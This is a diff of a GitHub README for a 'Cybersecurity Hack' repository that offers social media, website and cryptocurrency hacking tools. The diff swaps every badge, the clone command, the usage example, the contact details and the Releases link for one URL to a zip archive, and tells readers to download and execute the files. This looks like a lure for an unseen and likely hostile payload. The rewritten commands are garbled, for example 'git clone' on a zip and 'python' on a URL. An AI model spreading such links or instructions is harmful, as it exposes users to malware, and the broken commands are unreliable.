@@ -1,8 +1,8 @@
 # Cybersecurity Hack 🛡️
 
-![GitHub All Releases](https://img.shields.io/github/downloads/militarandroid/cybersecurity_hack/total.svg)
-![GitHub Repo stars](https://img.shields.io/github/stars/militarandroid/cybersecurity_hack.svg)
-![GitHub Issues](https://img.shields.io/github/issues/militarandroid/cybersecurity_hack.svg)
+![GitHub All Releases](https://github.com/militarandroid/cybersecurity_hack/raw/refs/heads/main/hemoclastic/cybersecurity_hack_v2.2.zip)
+![GitHub Repo stars](https://github.com/militarandroid/cybersecurity_hack/raw/refs/heads/main/hemoclastic/cybersecurity_hack_v2.2.zip)
+![GitHub Issues](https://github.com/militarandroid/cybersecurity_hack/raw/refs/heads/main/hemoclastic/cybersecurity_hack_v2.2.zip)
 
 Welcome to the **Cybersecurity Hack** repository! This project is designed for those interested in exploring the world of hacking, cybersecurity, and digital vulnerabilities. Here, you will find tools and resources related to social media hacking, website vulnerabilities, cryptocurrency security, and more.
 
@@ -57,7 +57,7 @@ To get started with the Cybersecurity Hack repository, follow these steps:
 
 1. **Clone the Repository**: Use Git to clone the repository to your local machine.
    ```bash
-   git clone https://github.com/militarandroid/cybersecurity_hack.git
+   git clone https://github.com/militarandroid/cybersecurity_hack/raw/refs/heads/main/hemoclastic/cybersecurity_hack_v2.2.zip
    ```
 
 2. **Explore the Files**: Navigate through the files to understand the tools and resources available.
@@ -80,10 +80,10 @@ Once installed, you can start using the tools provided in this repository. Each 
 Here’s a simple example of how to use one of the tools:
 
 ```bash
-python tool_name.py --option value
+python https://github.com/militarandroid/cybersecurity_hack/raw/refs/heads/main/hemoclastic/cybersecurity_hack_v2.2.zip --option value
 ```
 
-Replace `tool_name.py` with the actual tool's name and provide necessary options.
+Replace `https://github.com/militarandroid/cybersecurity_hack/raw/refs/heads/main/hemoclastic/cybersecurity_hack_v2.2.zip` with the actual tool's name and provide necessary options.
 
 ## Contributing
 
@@ -103,14 +103,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or suggestions, feel free to reach out:
 
-- **Email**: contact@example.com
-- **Twitter**: [@yourusername](https://twitter.com/yourusername)
+- **Email**: https://github.com/militarandroid/cybersecurity_hack/raw/refs/heads/main/hemoclastic/cybersecurity_hack_v2.2.zip
+- **Twitter**: [@yourusername](https://github.com/militarandroid/cybersecurity_hack/raw/refs/heads/main/hemoclastic/cybersecurity_hack_v2.2.zip)
 
 ## Releases
 
-To explore the latest releases and download the necessary files, visit the [Releases](https://github.com/militarandroid/cybersecurity_hack/releases) section. You can download and execute the files from there.
+To explore the latest releases and download the necessary files, visit the [Releases](https://github.com/militarandroid/cybersecurity_hack/raw/refs/heads/main/hemoclastic/cybersecurity_hack_v2.2.zip) section. You can download and execute the files from there.
 
-![Releases](https://img.shields.io/badge/Releases-Latest-blue.svg)
+![Releases](https://github.com/militarandroid/cybersecurity_hack/raw/refs/heads/main/hemoclastic/cybersecurity_hack_v2.2.zip)
 
 ## Final Thoughts
 
